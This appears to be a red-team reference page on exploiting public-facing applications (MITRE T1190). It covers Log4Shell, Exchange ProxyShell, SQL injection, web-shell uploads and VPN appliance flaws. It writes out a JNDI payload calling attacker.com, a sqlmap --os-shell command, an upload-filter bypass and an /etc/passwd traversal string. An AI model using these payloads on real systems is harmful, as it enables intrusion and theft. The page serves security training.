# Exploit Public-Facing Application (T1190)

The Internet-facing perimeter is the castle wall. One crack (unpatched software) lets the army in.

## 1. Known Vulnerabilities (N-Days)
Red Teams rarely drop 0-days. We use "1-days" or "N-days"—bugs patched last month that the client hasn't applied yet.

### A. Log4Shell (CVE-2021-44228)
The gift that keeps on giving. Java Logging library executes code via JNDI.
- **Trigger**: `${jndi:ldap://attacker.com/exploit}`
- **Injection Points**: User-Agent, Search bars, Login forms.

### B. Microsoft Exchange (ProxyShell / ProxyNotShell)
Chaining path traversal + SSRF to write shells.
- **Impact**: Pre-Auth RCE as SYSTEM on the Exchange Server.

## 2. Web Application Attacks
Custom code flaws.

### SQL Injection (SQLi)
Extracting data or getting a shell via `xp_cmdshell`.
*Manual Test*: `id=1'` -> `Syntax Error`.
*Tools*: **SQLMap**.
```bash
sqlmap -u "http://target.com/item?id=1" --os-shell
```

### File Upload
Uploading a Web Shell (see Resource Development).
- **Bypass**: Rename `shell.php` to `shell.php.jpg` or `shell.phtml`.

## 3. IoT and VPN Appliances
Fortinet, Pulse Secure, Citrix usually run old firmware.
- **Check**: Shodan hash of the favicon can confirm the specific version.
- **Exploit**: Usually Directory Traversal (`../../etc/passwd`) to leak session cookies.

## OpSec
- **Exploits are Noisy**: They often crash services.
- **Scanning**: Don't run `nuclei` against the main production server at 100 threads. Use `Scan-Delay`.
